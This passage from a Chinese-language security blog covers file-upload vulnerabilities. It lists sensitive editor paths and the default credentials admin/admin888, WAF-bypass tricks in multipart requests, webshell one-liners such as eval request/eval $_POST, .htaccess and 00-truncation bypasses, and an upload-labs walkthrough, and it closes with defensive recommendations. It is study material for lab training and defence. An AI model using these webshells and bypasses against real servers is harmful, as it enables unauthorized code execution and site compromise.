class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、敏感信息暴漏</span><br><span class="line">    * 查看版本信息</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/dialog/</span>fck_about.html</span><br><span class="line">    * 默认上传页面</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>browser<span class="regexp">/default/</span>browser.html</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>browser<span class="regexp">/default/</span>connectors/test.html</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>upload/test.html</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>connectors/test.html</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>connectors/uploadtest.html</span><br><span class="line">    * 其他敏感文件</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>connectors<span class="regexp">/aspx/</span>connector.html</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>connectors<span class="regexp">/asp/</span>connector.html</span><br><span class="line">        <span class="regexp">/FCKeditor/</span>editor<span class="regexp">/filemanager/</span>connectors<span class="regexp">/php/</span>connector.php</span><br><span class="line"><span class="number">2</span>、黑名单策略错误</span><br><span class="line">    FCKeditor&lt;=<span class="number">2.4</span><span class="number">.3</span>版本采用的是有弊端的黑名单策略，可以采用asa、cer等扩展名</span><br><span class="line"><span class="number">3</span>、任意文件上传漏洞</span><br><span class="line">    FCKeditor的<span class="number">2.4</span><span class="number">.2</span>及以下本本的黑名单配置信息里没有定义类型Media，直接构造html表单就行，</span><br><span class="line">在form中的action=<span class="string">"http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media"</span> 即可，然后上传</span><br></pre></td></tr></table></figure><h5 id="2-eWebEditor"><a href="#2-eWebEditor" class="headerlink" title="2 eWebEditor"></a>2 eWebEditor</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、默认后台</span><br><span class="line">    <span class="number">2.80</span>以前为：ewebeditor/admin_login.asp</span><br><span class="line">    <span class="number">2.80</span>以后为：admin/login.asp</span><br><span class="line"><span class="number">2</span>、默认账号密码</span><br><span class="line">    admin   admin888</span><br><span class="line"><span class="number">3</span>、数据库地址</span><br><span class="line">    默认数据库地址</span><br><span class="line">    ewebeditor/db/ewebeditor.mdb</span><br><span class="line">    常用数据库地址</span><br><span class="line">    ewebeditor/db/ewebeditor.asa</span><br><span class="line">    ewebeditor/db/ewebeditor.asa</span><br><span class="line">    ewebeditor/db/<span class="selector-id">#ewebeditor</span>.asa</span><br><span class="line">    ewebeditor/db/<span class="selector-id">#ewebeditor</span>.mdb</span><br><span class="line">    ewebeditor/db/!@<span class="selector-id">#ewebeditor</span>.asp</span><br><span class="line">    ewebeditor/db/ewebeditor1033.mdb</span><br><span class="line">    asp asa为后缀的数据库下载下来后改为mdb</span><br></pre></td></tr></table></figure><h4 id="针对各种WAF"><a href="#针对各种WAF" class="headerlink" title="针对各种WAF"></a>针对各种WAF</h4><h5 id="1-垃圾数据"><a href="#1-垃圾数据" class="headerlink" title="1 垃圾数据"></a>1 垃圾数据</h5><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</p><p><img src="https://images.seebug.org/content/images/2018/04/a7ae783e-9275-4e41-9c70-c899396fb012.png-w331s" alt="img"></p><p>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p><p><img src="https://images.seebug.org/content/images/2018/04/cd2f1355-be07-4c63-a802-0aa991bf2197.png-w331s" alt="img"></p><p>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p><h5 id="2-filename"><a href="#2-filename" class="headerlink" title="2 filename"></a>2 filename</h5><p>针对早期版本安全狗，可以多加一个filename</p><p><img src="https://images.seebug.org/content/images/2018/04/0bd2ce6f-25e0-4f59-b004-957ff71b1fd9.png-w331s" alt="img"></p><p>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：</p><p><img src="https://images.seebug.org/content/images/2018/04/d86eaa81-9a84-40dc-9347-6c5bfdbfeaf6.png-w331s" alt="img"></p><h5 id="3-POST-GET"><a href="#3-POST-GET" class="headerlink" title="3 POST/GET"></a>3 POST/GET</h5><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。 此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p><h5 id="4-以上方式"><a href="#4-以上方式" class="headerlink" title="4 以上方式"></a>4 以上方式</h5><p>针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。</p><p>**</p><h5 id="5-利用waf本身缺陷"><a href="#5-利用waf本身缺陷" class="headerlink" title="5 利用waf本身缺陷"></a>5 利用waf本身缺陷</h5><h6 id="删除实体里面的Conten-Type字段"><a href="#删除实体里面的Conten-Type字段" class="headerlink" title="删除实体里面的Conten-Type字段"></a>删除实体里面的Conten-Type字段</h6><p><img src="https://images.seebug.org/content/images/2018/04/f7b360e4-e055-43b7-ae94-b98419256476.png-w331s" alt="img"></p><p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正常包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png"Content-Type: image/png</span><br><span class="line">构造包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png</span><br><span class="line">C.php"</span><br></pre></td></tr></table></figure><h6 id="删除Content-Disposition字段里的空格"><a href="#删除Content-Disposition字段里的空格" class="headerlink" title="删除Content-Disposition字段里的空格"></a>删除Content-Disposition字段里的空格</h6><p><img src="https://images.seebug.org/content/images/2018/04/1ca10020-3739-4def-b0e1-f4b004a1f196.png-w331s" alt="img"></p><p>增加一个空格导致安全狗被绕过案列： Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099 尝试在boundary后面加个空格或者其他可被正常处理的字符： boundary= —————————47146314211411730218525550</p><h6 id="修改Content-Disposition字段值的大小写"><a href="#修改Content-Disposition字段值的大小写" class="headerlink" title="修改Content-Disposition字段值的大小写"></a>修改Content-Disposition字段值的大小写</h6><p><img src="https://images.seebug.org/content/images/2018/04/ae0437ec-b9f5-48db-a28f-75408445c23f.png-w331s" alt="img"></p><h6 id="Boundary边界不一致"><a href="#Boundary边界不一致" class="headerlink" title="Boundary边界不一致"></a>Boundary边界不一致</h6><p>每次文件上传时的Boundary边界都是一致的：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Content-<span class="keyword">Type</span>: multipart/form-data; boundary=<span class="comment">---------------------------4714631421141173021852555099</span></span><br><span class="line">Content-Length: <span class="number">253</span></span><br><span class="line"><span class="comment">-----------------------------4714631421141173021852555099</span></span><br><span class="line">Content-Disposition: form-data; <span class="type">name</span>="file1"; filename="shell.asp"</span><br><span class="line">Content-<span class="keyword">Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;%eval request("a")%&gt;</span><br><span class="line"><span class="comment">-----------------------------4714631421141173021852555099--</span></span><br></pre></td></tr></table></figure><p>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨： Win2k3 + IIS6.0 + ASP</p><p><img src="https://images.seebug.org/content/images/2018/04/c4f02267-e336-41c1-9423-3c86fa81856b.png-w331s" alt="img"></p><h6 id="文件名处回车"><a href="#文件名处回车" class="headerlink" title="文件名处回车"></a>文件名处回车</h6><p><img src="https://images.seebug.org/content/images/2018/04/80c9d74a-d9bc-411c-af2a-a704eb5e1aff.png-w331s" alt="img"></p><h6 id="多个Content-Disposition"><a href="#多个Content-Disposition" class="headerlink" title="多个Content-Disposition"></a>多个Content-Disposition</h6><p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP</p><p><img src="https://images.seebug.org/content/images/2018/04/6b945737-c4b4-4350-a5ba-972b35b09fda.png-w331s" alt="img"></p><h5 id="利用NTFS-ADS特性"><a href="#利用NTFS-ADS特性" class="headerlink" title="利用NTFS ADS特性"></a>利用NTFS ADS特性</h5><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。</p><p><img src="https://images.seebug.org/content/images/2018/04/b3625731-9f1d-4889-8609-b357b61a2368.png-w331s" alt="img"></p><h5 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h5><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。</p><p><img src="https://images.seebug.org/content/images/2018/04/95eabfd7-54b0-4f0f-971f-2316423fac33.png-w331s" alt="img"></p><h5 id="特殊的长文件名绕过"><a href="#特殊的长文件名绕过" class="headerlink" title="特殊的长文件名绕过"></a>特殊的长文件名绕过</h5><p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：</p><p>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</p><h5 id="反删除"><a href="#反删除" class="headerlink" title="反删除"></a>反删除</h5><p>将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）</p><p><img src="https://images.seebug.org/content/images/2018/04/389b0352-5ba1-4d7c-8d77-198dab060856.png-w331s" alt="img"></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">条件： 寻找一个上传点，查看上传点是否可用。</span><br><span class="line"></span><br><span class="line">利用：</span><br><span class="line"></span><br><span class="line">首先判断是程序员自己写的上传点，还是编辑器的上传功能</span><br><span class="line"></span><br><span class="line">如果是编辑器上传功能，goolge当前编辑器的漏洞</span><br><span class="line"></span><br><span class="line">如果是程序员写的上传点</span><br><span class="line"></span><br><span class="line">上传一个正常的jpg图片 查看上传点是否可用</span><br><span class="line"></span><br><span class="line">上传一个正常的jpg图片，burp拦截，修改后缀为php (可以检测前端验证 MIME检测 文件内容检测 后缀检测）</span><br><span class="line"></span><br><span class="line">上传一个正常的jpg图片，burp拦截， 00截断 1.php%00.jpg</span><br><span class="line"></span><br><span class="line">判断服务器是什么类型，web服务器程序，是什么类型，版本号多少</span><br><span class="line"></span><br><span class="line">利用解析漏洞</span><br></pre></td></tr></table></figure><h4 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h4><ol><li>使用白名单限制可以上传的文件扩展（白名单比黑名单可靠多了）</li><li>验证文件内容，使用正则匹配恶意代码限制上传</li><li>对上传后的文件统一随机命名，不允许用户控制扩展名</li><li>修复服务器可能存在的解析漏洞</li><li>严格限制可以修改服务器配置的文件上传如：.htaccess</li><li>隐藏上传文件路径。</li><li>升级Web Server</li><li>及时修复Web上传代码（重要）</li><li>不能有本地文件包含漏洞</li><li>注意0x00截断攻击（PHP更新到最新版本）</li><li>上传文件的存储目录禁用执行权限</li></ol><h3 id="文件上传漏洞的主要利用和绕过方式总结。"><a href="#文件上传漏洞的主要利用和绕过方式总结。" class="headerlink" title="文件上传漏洞的主要利用和绕过方式总结。"></a>文件上传漏洞的主要利用和绕过方式总结。</h3><p><strong>1.前端JS绕过</strong></p><p>基于本地验证文件是否符合要求：直接将<strong>JavaScript</strong>禁用。或者burp抓包后修改后缀，将php文件后缀现先改为jpg，burp抓包后后缀改回php。</p><p><strong>2.MIME 类型验证</strong></p><p>burp抓包将<strong>Content-type</strong>类型修改为image/jpeg，image/png等</p><p><strong>3.黑名单验证</strong></p><p>1.寻找没有过滤的类型：phtml php3 php4 php5  PHP phtml</p><p>2.大小写绕过：例如Php</p><p><strong>4.文件内容验证</strong></p><p>1<strong>.getimagesize()函数获取图像信息</strong>：通过构造图片马进行绕过。</p><p>2.<strong>文件头绕过</strong>：例如 GIF89a <?php phpinfo(); ?></p><p>2.<strong>检验关键字</strong>&lt;?php:利用script标签绕过：<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;hack&#39;]);&lt;/script&gt;</code></p><p><strong>6. .htaccess上传</strong></p><p>上传的.jpg文件都会以php格式解析</p><p>.htaccess内容</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType   <span class="built_in">application</span>/x-httpd-php     .jpg</span><br></pre></td></tr></table></figure><p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们可以把要上传的php文件的后缀名改为.jpg格式从而绕过</p><p><strong>7.00截断绕过</strong></p><p>php.   jpg  将空格二进制20改为00；</p><p><strong>8.win系统解析漏洞绕过</strong></p><p>1.上传1.php(或者图片马)，抓包修改为1.php.</p><p>2.上传1.php(或者图片马)，抓包修改为1.php::$DATA</p><p>3.上传1.php(或者图片马)，抓包修改为1.php:1.jpg</p><p>4.上传1.php(或者图片马)，抓包修改为1.php::$DATA…….</p><p><strong>9.文件包含绕过</strong>：首先上传图片木马shell.jpg，然后上传可以进行文件包含的php文件,比如上传1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$x=$_GET[<span class="string">'x'</span>];</span><br><span class="line"><span class="keyword">include</span>($x);</span><br></pre></td></tr></table></figure><p>然后我们访问1.php?x=shell.jpg即可。</p><p><strong>10.条件竞争绕过</strong></p><p>通过BURP不断发包，导致不断写入webshell,再写入速度频率上超过安全软件查杀频率，导致绕过。</p><p><strong>11.二次渲染绕过</strong></p><p>上传图片加载后，会对图片进行二次渲养，改变大部分图片源码，绕过为：对照上传后的图片与原图片放在winhex中对不，查看图片哪个数据块没有被改变。将木马代码放在没有改变的一块中，在不损坏图片的前提下，即可绕过上传</p><p><strong>12.中间件解析漏洞</strong></p><p>apache：上传图片马，抓包修改为1.php.xxxx.abc</p><p>iis6.0 6.5：上传图片马，抓包修改猴嘴为.asa、.cer和.cdx等。</p><p>​                    上传图片马，抓包修改为1.asp;.jpg或者%00 /00也可以</p><p>​                    上传图片马，抓包发现有保存图片的路径，如../upload/image</p><p>nginx: 上传图片马，拿到图片马的路径，访问的时候加上/.php 就可作为php文件解析,如         </p><p>​            upload/image/1.jpg/.php</p><p>tomcat:弱口令进入后台，上传war包即可，shell.jsp–&gt;shell.zip–&gt;shell.war</p><h3 id="靶场：upload-labs-实战总结"><a href="#靶场：upload-labs-实战总结" class="headerlink" title="靶场：upload-labs 实战总结"></a>靶场：upload-labs 实战总结</h3><p><strong>upolad-labs考察知识点汇总：</strong></p><img src="11525934-e19630249b9b8764.png"  /><p>​    upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p><h5 id="Pass-01-前端js检测"><a href="#Pass-01-前端js检测" class="headerlink" title="Pass-01-前端js检测"></a>Pass-01-前端js检测</h5><p><strong>考察知识点：</strong>前端js检测，我们可以选择禁用js,或者直接burp直接抓包绕过.。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115201219.png" alt=""></p><h5 id="Pass-02-只检测Content-type"><a href="#Pass-02-只检测Content-type" class="headerlink" title="Pass-02 只检测Content-type"></a>Pass-02 只检测Content-type</h5><p><strong>考察知识点：</strong>Content-Type绕过，我们直接改为 image/jpeg</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115201548.png" alt=""></p><h5 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h5><p><strong>考察知识点：</strong>黑名单绕过，禁止上传.asp|.aspx|.php|.jsp后缀文件，但是我们可以上传.php3 .phtml .php5另类后缀名。</p><h5 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04  .htaccess绕过"></a>Pass-04  .htaccess绕过</h5><p><strong>考察知识点：</strong>构造.htaccess文件，内容为<code>AddType  application/x-httpd-php  .jpg</code></p><p>我们首先上传.htaccess文件，</p><img src="QQ截图20200124121848.png" style="zoom: 80%;" /><p>然后上传我们事先准备好的php文件将后缀改为.jpg文件,</p><img src="QQ截图20200124122245.png" style="zoom:150%;" /><p>可以在本地看到成功上传。</p><h5 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h5><p><strong>考察知识点：</strong>因为此次黑名单过滤了.htaccess，但是没有将文件名转换为小写。所以我们可以通过大小写绕过。</p><img src="QQ截图20200124124135.png" style="zoom: 80%;" /><h5 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h5><p><strong>考察知识点</strong>：修改文件后缀为<code>1.php空格</code>.,利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格,达到上传.php的目的</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200124124135.png" alt=""></p><h5 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h5><p><strong>考察知识点：</strong>wIndow命名规则:window下 xx.php空格xx.php.不允许存在，系统会默认去除空格或点。此处过滤了空格，但是没有过滤点。我们用burp将文件后缀改为php.即可。</p><img src="QQ截图20200124130943.png" style="zoom:150%;" /><h5 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08  ::$DATA绕过"></a>Pass-08  ::$DATA绕过</h5><p><strong>考察知识点</strong>：$DATA绕过：在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p><p>所以：文件后缀改为：<code>xx.php::$DATA</code>即可</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115202909.png" alt=""></p><h5 id="Pass-09-点空格点绕过"><a href="#Pass-09-点空格点绕过" class="headerlink" title="Pass-09 点空格点绕过"></a>Pass-09 点空格点绕过</h5><p>这里我们分析一下源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件类型不允许上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实已经过滤的很严格了。</p><p>依次进行了严格的黑名单过滤、转换大小写、去除文件名尾的空格和点。还去除了;$DATA.</p><p>但是这里存在很明显的代码逻辑漏洞：代码<strong>去点，除空</strong>的操作只进行了一次。那么我们把后缀名改为</p><p><strong>php. .</strong> 点 空格点的格式。最后的后缀名为<strong>.php.</strong> 成功绕过。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115204443.png" alt=""></p><h5 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h5><p>考察知识点:双写绕过，这里利用了<code>str_irepalce</code>函数将不符合上传的后缀名替换为空，且该函数对 大小写不敏感，我们可以通过双写后缀名 .pphphp进行绕过。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115205208.png" alt=""></p><h5 id="Pass-11-get-00截断"><a href="#Pass-11-get-00截断" class="headerlink" title="Pass-11 get 00截断"></a>Pass-11 get 00截断</h5><p>考察知识点：00截断</p><img src="QQ截图20200124131542.png" style="zoom:50%;" /><p><strong>Pass-12 Post 00截断</strong></p><p>考察知识点：00截断</p><p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128202954.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128203026.png" alt=""></p><h4 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h4><p>考察知识点：图片马，结合文件包含</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115211730.png" alt=""></p><p><img src="QQ%E6%88%AA%E5%9B%BE20200115211949.png" alt=""></p><h5 id="拓展资料"><a href="#拓展资料" class="headerlink" title="拓展资料"></a>拓展资料</h5><ul><li><a href="http://thief.one/2016/09/21/服务器解析漏洞/" target="_blank" rel="noopener">http://thief.one/2016/09/21/服务器解析漏洞/</a></li></ul><h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><ul><li><a href="http://www.y-hkl.top/2017/09/16/文件上传漏洞解析及绕过姿势/" target="_blank" rel="noopener">文件上传漏洞解析及绕过姿势</a></li><li><a href="http://www.cnblogs.com/stevenwuzheng/p/5354236.html" target="_blank" rel="noopener">http://www.cnblogs.com/stevenwuzheng/p/5354236.html</a></li><li><a href="https://blog.csdn.net/weiwangchao_/article/details/46686505" target="_blank" rel="noopener">https://blog.csdn.net/weiwangchao_/article/details/46686505</a></li><li><a href="http://www.myh0st.cn/index.php/archives/7/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/7/</a></li><li><a href="http://rdc.hundsun.com/portal/article/627.html" target="_blank" rel="noopener">http://rdc.hundsun.com/portal/article/627.html</a></li><li><a href="http://jdrops.dropsec.xyz/2017/07/17/文件上传漏洞总结/" target="_blank" rel="noopener">文件上传漏洞总结</a></li><li><a href="https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/" target="_blank" rel="noopener">文件上传漏洞（绕过姿势）</a></li><li><a href="http://wyb0.com/posts/file-upload-editor-upload-vulnerability/" target="_blank" rel="noopener">http://wyb0.com/posts/file-upload-editor-upload-vulnerability/</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;文件上传漏洞学习笔记-靶场实战&quot;&gt;&lt;a href=&quot;#文件上传漏洞学习笔记-靶场实战&quot; class=&quot;headerlink&quot; title=&quot;文件上传漏洞学习笔记+靶场实战&quot;&gt;&lt;/a&gt;文件上传漏洞学习笔记+靶场实战&lt;/h1&gt;&lt;h4 id=&quot;一-什么是文件上传漏洞&quot;&gt;
      
    
    </summary>
    
    
      <category term="web漏洞学习" scheme="https://shu1l.github.io/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="文件上传漏洞" scheme="https://shu1l.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>命令执行/代码执行漏洞学习</title>
    <link href="https://shu1l.github.io/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/"/>
    <id>https://shu1l.github.io/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/</id>
    <published>2020-04-03T08:48:40.000Z</published>
    <updated>2020-04-30T07:38:04.544Z</updated>
    
